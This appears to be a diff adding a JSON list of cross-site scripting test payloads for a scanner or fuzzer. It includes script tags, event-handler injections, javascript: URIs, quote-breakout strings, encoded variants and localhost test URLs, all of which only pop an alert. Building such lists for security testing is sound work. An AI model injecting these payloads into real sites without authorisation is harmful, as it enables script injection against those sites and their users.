@@ -1,0 +1,38 @@
+{ "tag":[       "<script>alert(0xdeadbeef)</script>",
+                "<script>alert(0xdeadbeeef)</script>",
+                "<script>alert(0xdeadbeeeef)</script>",
+                "<script>alert(0xdead)</script>",
+                "<img src='x' onerror='alert(0xdeadbeef)'>",
+                "<a href='javascript:alert(0xdeadbeef)'",
+                "><script>alert(0xdeadbeef)</script>",
+                "><img src=x onerror=alert(0xdeadbeef)>",
+                "<svg onload=\"alert('0xdeadbeef')\">",
+                "<svg onload=alert('0xdeadbeef')>",
+                "\"><img src=x onerror=alert(0xdeadbeef)>",
+                "\"><body onload=alert(0xdeadbeef)>",
+                "</title><script>alert(0xdeadbeef)</script>",
+                "</textarea><script>alert(0xdeadbeef)</script>",
+                "<a href=\"javascript:alert(0xdeadbeef)\">click</a>",
+                "<iframe src=\"javascript:alert(0xdeadbeef)\">",
+                "<math href=\"javascript:alert(0xdeadbeef)\">CLICK</math>",
+                "\"><svg/onload=alert(0xdeadbeef)//",
+                "\"><img src=x onerror=alert(0xdeadbeef)>",
+                "\"><x onmouseover=alert(0xdeadbeef)>",
+                "\"><script>alert`0xdeadbeef`</script>",
+                "file:///C:/tests/index.html?search=<script>alert(0xdeadbeef)</script>",
+                "file:///C:/tests/index.html?search=<script>alert(0xdead)</script>",
+                "http://localhost/tests/index.html?search=<script>alert(0xdeadbeef)</script>",
+                "http://localhost/tests/index.html?search=<script>alert(0xdead)</script>"
+
+            ],
+ "non_tag": [       
+                "';alert(0xdeadbeef);//",
+                "\";alert(0xdeadbeef);//",
+                "');alert(0xdeadbeef);//",
+                "%3Cscript%3Ealert(0xdeadbeef)%3C/script%3E",
+                "¼script¾alert(¢XSS¢)¼/script¾",
+                "jaVasCript:alert(0xdeadbeef)",
+                "http://localhost/index.php?default=</option><img src=x onerror=alert(0xdeadbeef)>",
+                "http://localhost/index.php?default=</option><img src=x onerror=alert(0xdead)>"
+            ] 
+}
